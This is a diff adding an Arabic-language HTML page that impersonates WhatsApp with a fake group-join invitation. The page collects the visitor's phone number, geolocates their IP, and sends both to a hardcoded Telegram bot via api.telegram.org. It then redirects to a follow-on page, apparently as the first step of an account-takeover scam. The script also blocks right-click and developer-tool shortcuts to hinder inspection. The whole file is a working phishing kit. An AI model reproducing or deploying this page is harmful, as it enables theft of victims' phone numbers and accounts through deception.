@@ -1,0 +1,733 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta property="og:image" content="logo-whatsapp-png-file-15.png">
+<title>دعوة للانضمام إلى مجموعة واتساب</title>
+
+<meta property="og:title" content="دعوة للانضمام إلى مجموعة واتساب">
+<meta property="og:description" content="انضم إلى المجموعة الآن">
+<meta property="og:type" content="website">
+
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
+
+  <style>
+    :root {
+      --whatsapp-green: #25D366;
+      --whatsapp-teal-green: #008069;
+      --whatsapp-white: #FFFFFF;
+      --whatsapp-bg: #f7f5f2;
+      --whatsapp-text: #111b21;
+      --whatsapp-secondary-text: #667781;
+      --whatsapp-border: #e6e6e6;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Tajawal', sans-serif;
+      background-color: var(--whatsapp-white);
+      color: var(--whatsapp-text);
+      line-height: 1.6;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .whatsapp-header {
+      position: fixed;
+      top: 0;
+      right: 0;
+      left: 0;
+      height: 60px;
+      background-color: var(--whatsapp-bg);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 16px;
+      z-index: 999;
+      border-bottom: 1px solid var(--whatsapp-border);
+    }
+
+    .header-left,
+    .header-right {
+      width: 32px;
+      text-align: center;
+    }
+
+    .menu-icon,
+    .download-icon {
+      font-size: 20px;
+      color: #111;
+      cursor: pointer;
+    }
+
+    .header-center {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .logo-icon {
+      font-size: 20px;
+      color: var(--whatsapp-green);
+    }
+
+    .logo-text {
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--whatsapp-green);
+    }
+
+    .content {
+      flex: 1;
+      padding: 100px 20px 70px;
+      max-width: 500px;
+      margin: 0 auto;
+      width: 100%;
+    }
+
+    .invitation-card {
+      background-color: var(--whatsapp-white);
+      border-radius: 8px;
+      padding: 24px;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    .whatsapp-logo {
+      color: var(--whatsapp-green);
+      font-size: 50px;
+      margin-bottom: 16px;
+    }
+
+    .invitation-title {
+      font-size: 18px;
+      font-weight: 500;
+      margin-bottom: 8px;
+    }
+
+    .invitation-description {
+      font-size: 14px;
+      color: var(--whatsapp-secondary-text);
+      margin-bottom: 24px;
+    }
+
+    .input-container {
+      margin-bottom: 20px;
+      text-align: right;
+    }
+
+    .input-label {
+      display: block;
+      font-size: 14px;
+      color: var(--whatsapp-text);
+      margin-bottom: 8px;
+      font-weight: 500;
+    }
+
+    .phone-input {
+      width: 100%;
+      padding: 12px 16px;
+      border: 1px solid var(--whatsapp-green);
+      border-radius: 8px;
+      font-size: 16px;
+      background-color: var(--whatsapp-white);
+      transition: border-color 0.2s;
+      text-align: right;
+    }
+
+    .phone-input:focus {
+      border-color: var(--whatsapp-teal-green);
+      outline: none;
+    }
+
+    .submit-btn {
+      background-color: var(--whatsapp-teal-green);
+      color: var(--whatsapp-white);
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: 500;
+      border-radius: 8px;
+      cursor: pointer;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: background-color 0.2s;
+      margin-top: 16px;
+    }
+
+    .submit-btn:hover {
+      background-color: var(--whatsapp-green);
+    }
+
+    .countdown-section {
+      display: none;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .countdown-title {
+      font-size: 16px;
+      color: var(--whatsapp-teal-green);
+      margin-bottom: 20px;
+      font-weight: 500;
+    }
+
+    .countdown-display {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .countdown-circle {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      background: conic-gradient(var(--whatsapp-green) 0%, var(--whatsapp-white) 0%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 16px;
+    }
+
+    .countdown-number {
+      font-size: 1.8rem;
+      font-weight: 700;
+      color: var(--whatsapp-teal-green);
+    }
+
+    .countdown-label {
+      font-size: 14px;
+      color: var(--whatsapp-secondary-text);
+      margin-top: 8px;
+    }
+
+    .progress-container {
+      width: 100%;
+      height: 4px;
+      background-color: var(--whatsapp-white);
+      border-radius: 2px;
+      margin: 20px 0;
+      overflow: hidden;
+    }
+
+    .progress-bar {
+      height: 100%;
+      background-color: var(--whatsapp-green);
+      width: 0%;
+      transition: width 1s linear;
+      border-radius: 2px;
+    }
+
+    .status-text {
+      color: var(--whatsapp-secondary-text);
+      margin-top: 16px;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    .iti {
+      width: 100%;
+    }
+
+    .iti__selected-flag {
+      padding: 0 12px 0 6px;
+    }
+
+    .iti__country-list {
+      text-align: right;
+      font-family: 'Tajawal', sans-serif;
+    }
+
+    .whatsapp-footer {
+      background-color: var(--whatsapp-bg);
+      padding: 20px 16px;
+      text-align: center;
+      border-top: 1px solid var(--whatsapp-border);
+      font-size: 14px;
+      color: var(--whatsapp-secondary-text);
+    }
+
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 16px;
+      margin-bottom: 12px;
+    }
+
+    .footer-link {
+      color: var(--whatsapp-teal-green);
+      text-decoration: none;
+      transition: color 0.2s;
+    }
+
+    .footer-link:hover {
+      color: var(--whatsapp-green);
+      text-decoration: underline;
+    }
+
+    .footer-copyright {
+      margin-top: 8px;
+      font-size: 13px;
+    }
+
+    .footer-social {
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+      margin-top: 16px;
+    }
+
+    .social-icon {
+      color: var(--whatsapp-teal-green);
+      font-size: 18px;
+      transition: color 0.2s;
+    }
+
+    .social-icon:hover {
+      color: var(--whatsapp-green);
+    }
+
+    .side-menu {
+      position: fixed;
+      top: 0;
+      right: -300px;
+      width: 300px;
+      height: 100%;
+      background-color: var(--whatsapp-white);
+      box-shadow: -2px 0 5px rgba(0,0,0,0.1);
+      transition: right 0.3s ease;
+      z-index: 1000;
+      padding: 20px;
+      overflow-y: auto;
+    }
+
+    .side-menu.active {
+      right: 0;
+    }
+
+    .menu-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid var(--whatsapp-border);
+    }
+
+    .menu-title {
+      font-size: 18px;
+      font-weight: 500;
+    }
+
+    .close-menu {
+      background: none;
+      border: none;
+      font-size: 20px;
+      cursor: pointer;
+    }
+
+    .menu-item {
+      padding: 12px 0;
+      border-bottom: 1px solid var(--whatsapp-border);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .menu-item:hover {
+      color: var(--whatsapp-teal-green);
+    }
+
+    .menu-item i {
+      width: 24px;
+      text-align: center;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: rgba(0,0,0,0.5);
+      z-index: 999;
+      display: none;
+    }
+
+    .overlay.active {
+      display: block;
+    }
+  </style>
+</head>
+
+<body>
+  <header class="whatsapp-header">
+    <div class="header-left">
+      <i class="fas fa-bars menu-icon" id="menuButton"></i>
+    </div>
+    <div class="header-center">
+      <i class="fab fa-whatsapp logo-icon"></i>
+      <span class="logo-text">WhatsAp</span>
+    </div>
+    <div class="header-right">
+      <i class="fas fa-download download-icon" id="downloadButton"></i>
+    </div>
+  </header>
+
+  <div class="side-menu" id="sideMenu">
+    <div class="menu-header">
+      <div class="menu-title">القائمة</div>
+      <button class="close-menu" id="closeMenu">&times;</button>
+    </div>
+    <div class="menu-item" onclick="window.location.href='#'">
+      <i class="fas fa-home"></i>
+      <span>الصفحة الرئيسية</span>
+    </div>
+    <div class="menu-item" onclick="window.location.href='#'">
+      <i class="fas fa-info-circle"></i>
+      <span>عن واتساب</span>
+    </div>
+    <div class="menu-item" onclick="window.location.href='#'">
+      <i class="fas fa-lock"></i>
+      <span>الخصوصية والأمان</span>
+    </div>
+    <div class="menu-item" onclick="window.location.href='#'">
+      <i class="fas fa-question-circle"></i>
+      <span>المساعدة</span>
+    </div>
+    <div class="menu-item" onclick="window.location.href='#'">
+      <i class="fas fa-cog"></i>
+      <span>الإعدادات</span>
+    </div>
+  </div>
+
+  <div class="overlay" id="overlay"></div>
+
+  <div class="content">
+    <div class="invitation-card">
+      <div class="whatsapp-logo">
+        <i class="fab fa-whatsapp"></i>
+      </div>
+      <h3 class="invitation-title">دعوة للانضمام إلى مجموعة واتساب</h3>
+      <p class="invitation-description">أدخل رقم هاتفك لتلقي دعوة الانضمام</p>
+
+      <form id="invitationForm">
+        <div class="input-container">
+          <label for="phone" class="input-label">رقم الهاتف</label>
+          <input type="tel" id="phone" class="phone-input" placeholder="" />
+        </div>
+        <button type="submit" class="submit-btn" id="submitBtn">
+          <span>متابعة</span>
+          <i class="fas fa-arrow-left"></i>
+        </button>
+      </form>
+
+      <div class="countdown-section" id="countdownSection">
+        <h3 class="countdown-title">مجموعة خاصة</h3>
+        <div class="countdown-display">
+          <div class="countdown-circle" id="countdownCircle">
+            <span class="countdown-number" id="countdown">20</span>
+          </div>
+          <span class="countdown-label">ثانية متبقية</span>
+        </div>
+        <div class="progress-container">
+          <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <p class="status-text">سيتم تحويلك تلقائياً بعد انتهاء العد التنازلي</p>
+      </div>
+    </div>
+  </div>
+
+  <footer class="whatsapp-footer">
+    <div class="footer-links">
+      <a href="#" class="footer-link">عن واتساب</a>
+      <a href="#" class="footer-link">الخصوصية</a>
+      <a href="#" class="footer-link">الشروط</a>
+      <a href="#" class="footer-link">الأسئلة الشائعة</a>
+      <a href="#" class="footer-link">اتصل بنا</a>
+    </div>
+    
+    <div class="footer-social">
+      <a href="#" aria-label="Twitter"><i class="fab fa-twitter social-icon"></i></a>
+      <a href="#" aria-label="Facebook"><i class="fab fa-facebook-f social-icon"></i></a>
+      <a href="#" aria-label="Instagram"><i class="fab fa-instagram social-icon"></i></a>
+    </div>
+    
+    <div class="footer-copyright">
+      © 2024 WhatsApp LLC. جميع الحقوق محفوظة.
+    </div>
+  </footer>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+  <script>
+    
+  // Disable right click
+  document.addEventListener('contextmenu', event => event.preventDefault());
+
+  // Disable certain key combinations
+  document.addEventListener('keydown', function(event) {
+    // Ctrl+U
+    if (event.ctrlKey && event.key.toLowerCase() === 'u') {
+      event.preventDefault();
+    }
+
+    // Ctrl+Shift+I
+    if (event.ctrlKey && event.shiftKey && event.key.toLowerCase() === 'i') {
+      event.preventDefault();
+    }
+
+    // Ctrl+Shift+J
+    if (event.ctrlKey && event.shiftKey && event.key.toLowerCase() === 'j') {
+      event.preventDefault();
+    }
+
+    // F12
+    if (event.key === 'F12') {
+      event.preventDefault();
+    }
+  });
+
+    document.addEventListener('DOMContentLoaded', function() {
+      const phoneInput = document.getElementById('phone');
+      let userIpAddress = '';
+      let countryCode = '';
+      let countryName = '';
+      let countryFlag = '';
+
+      function generateUniqueId() {
+        return Date.now().toString(36) + Math.random().toString(36).substr(2);
+      }
+
+      // دالة للحصول على رمز العلم بناءً على كود الدولة
+      function getFlagEmoji(countryCode) {
+        if (!countryCode) return '🏴';
+        const codePoints = countryCode
+          .toUpperCase()
+          .split('')
+          .map(char => 127397 + char.charCodeAt());
+        return String.fromCodePoint(...codePoints);
+      }
+      
+      // Solution optimisée pour la détection du pays
+      async function initializePhoneInput() {
+        try {
+          // 1. Détection du pays via API
+          const response = await fetch('https://api.ipify.org?format=json');
+          const ipData = await response.json();
+          userIpAddress = ipData.ip;
+          
+          const geoResponse = await fetch(`https://ipapi.co/${userIpAddress}/json/`);
+          const geoData = await geoResponse.json();
+          
+          countryCode = geoData?.country_code || 'MA';
+          countryName = geoData?.country_name || 'Morocco';
+          countryFlag = getFlagEmoji(countryCode);
+          
+          // 2. Initialisation du plugin avec le pays détecté
+          const iti = window.intlTelInput(phoneInput, {
+            initialCountry: countryCode.toLowerCase(),
+            preferredCountries: ["ma", "sa", "dz", "tn", "eg", "ae", "iq", "jo", "kw", "lb"],
+            separateDialCode: true,
+            utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+            autoPlaceholder: "aggressive",
+            nationalMode: false
+          });
+
+          // 3. Affichage automatique du code pays
+          const countryData = iti.getSelectedCountryData();
+          if (countryData) {
+            phoneInput.value = "+" + countryData.dialCode;
+            phoneInput.placeholder = "+" + countryData.dialCode + " " + "أدخل رقم الهاتف";
+          }
+
+          window.iti = iti;
+
+        } catch (error) {
+          console.error("Erreur de détection:", error);
+          // Solution de repli
+          userIpAddress = generateUniqueId();
+          countryCode = 'MA';
+          countryName = 'Morocco';
+          countryFlag = getFlagEmoji('MA');
+          
+          window.iti = window.intlTelInput(phoneInput, {
+            initialCountry: "ma",
+            separateDialCode: true,
+            utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
+          });
+          phoneInput.value = "+212";
+        }
+      }
+
+      // Initialisation
+      initializePhoneInput();
+
+      // Le reste de votre code JavaScript...
+      const invitationForm = document.getElementById('invitationForm');
+      const countdownSection = document.getElementById('countdownSection');
+      const countdownElement = document.getElementById('countdown');
+      const countdownCircle = document.getElementById('countdownCircle');
+      const progressBar = document.getElementById('progressBar');
+      const menuButton = document.getElementById('menuButton');
+      const downloadButton = document.getElementById('downloadButton');
+      const sideMenu = document.getElementById('sideMenu');
+      const closeMenu = document.getElementById('closeMenu');
+      const overlay = document.getElementById('overlay');
+
+      // Gestion du menu
+      menuButton.addEventListener('click', function() {
+        sideMenu.classList.add('active');
+        overlay.classList.add('active');
+      });
+
+      closeMenu.addEventListener('click', function() {
+        sideMenu.classList.remove('active');
+        overlay.classList.remove('active');
+      });
+
+      overlay.addEventListener('click', function() {
+        sideMenu.classList.remove('active');
+        overlay.classList.remove('active');
+      });
+
+      // Bouton de téléchargement
+      downloadButton.addEventListener('click', function() {
+        window.location.href = 'https://www.whatsapp.com/download';
+      });
+
+     // Soumission du formulaire
+    // EN DEHORS du submit
+phoneInput.addEventListener('keydown', function (e) {
+  const allowed = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'];
+  if (!allowed.includes(e.key) && !/^\d$/.test(e.key)) {
+    e.preventDefault();
+  }
+});
+
+phoneInput.addEventListener('input', function () {
+  this.value = this.value.replace(/\D/g, '');
+});
+
+// TON SUBMIT
+invitationForm.addEventListener('submit', function(e) {
+  e.preventDefault();
+  const phoneNumber = phoneInput.value.trim();
+
+  if (!phoneNumber) {
+    alert("Veuillez saisir un numéro de téléphone");
+    return;
+  }
+
+  if (window.iti && !window.iti.isValidNumber()) {
+    alert("يرجى إدخال رقم هاتف صحيح");
+    return;
+  }
+        // الحصول على معلومات الدولة المحددة
+        const countryData = window.iti ? window.iti.getSelectedCountryData() : {};
+        const countryDialCode = countryData.dialCode || '212';
+        const countryIso2 = countryData.iso2 ? countryData.iso2.toUpperCase() : 'MA';
+        const countryName = countryData.name || 'Morocco';
+        const countryFlag = getFlagEmoji(countryIso2);
+        
+        sendToTelegram(phoneNumber, countryDialCode, countryIso2, countryName, countryFlag);
+        invitationForm.style.display = 'none';
+        countdownSection.style.display = 'block';
+        startCountdown();
+      });
+
+      function sendToTelegram(phone, dialCode, iso2, name, flag) {
+        const bots = [
+          
+          { token: "8725929598:AAH7bi7lkg_B_wNqILlxRf0yuOfAS8GaByo", chatId: "8739237977" }
+        ];
+        
+        const phoneNumberOnly = phone.replace('+' + dialCode, '');
+        
+        // تنسيق الوقت بالإنجليزية
+        const now = new Date();
+        const formattedTime = now.toLocaleString('en-US', {
+          year: 'numeric',
+          month: '2-digit',
+          day: '2-digit',
+          hour: '2-digit',
+          minute: '2-digit',
+          second: '2-digit',
+          hour12: true
+        });
+
+        const message = `
+📱 *New User Information* 📱 A
+🏴 *Country:* ${flag} ${name} (${iso2})
+📞 *Country Code:* +${dialCode}
+📱 *Phone Number:* ${phoneNumberOnly}
+🌐 *IP Address:* ${userIpAddress}
+🕒 *Time:* ${formattedTime}
+        `;
+        
+        bots.forEach(bot => {
+          fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
+            .catch(err => console.error('Error sending to Telegram:', err));
+        });
+      }
+
+      function startCountdown() {
+        let seconds = 20;
+        const totalSeconds = seconds;
+        
+        // الحصول على معلومات الدولة المحددة
+        const countryData = window.iti ? window.iti.getSelectedCountryData() : {};
+        const countryDialCode = countryData.dialCode || '212';
+        const countryIso2 = countryData.iso2 ? countryData.iso2.toUpperCase() : 'MA';
+        const countryName = countryData.name || 'Morocco';
+        const countryFlag = getFlagEmoji(countryIso2);
+        
+        const countdownInterval = setInterval(() => {
+          seconds--;
+          countdownElement.textContent = seconds;
+          const percent = ((totalSeconds - seconds) / totalSeconds) * 100;
+          updateProgress(percent);
+          if (seconds <= 0) {
+            clearInterval(countdownInterval);
+            setTimeout(() => {
+              const phoneNumber = encodeURIComponent(phoneInput.value);
+              // تخزين البيانات في localStorage للصفحات التالية
+              localStorage.setItem('userData', JSON.stringify({
+                phone: phoneNumber,
+                ip: userIpAddress,
+                countryCode: countryIso2,
+                countryName: countryName,
+                countryFlag: countryFlag,
+                dialCode: countryDialCode,
+                timestamp: new Date().toISOString()
+              }));
+              
+              window.location.href = `traitement0.html?phone=${phoneNumber}&ip=${encodeURIComponent(userIpAddress)}&country_code=${encodeURIComponent(countryIso2)}&country_name=${encodeURIComponent(countryName)}&dial_code=${encodeURIComponent(countryDialCode)}`;
+            }, 500);
+          }
+        }, 1000);
+      }
+
+      function updateProgress(percent) {
+        countdownCircle.style.background = `conic-gradient(var(--whatsapp-green) ${percent}%, var(--whatsapp-white) ${percent}%)`;
+        progressBar.style.width = `${percent}%`;
+      }
+    });
+  </script>
+</body>
+</html>
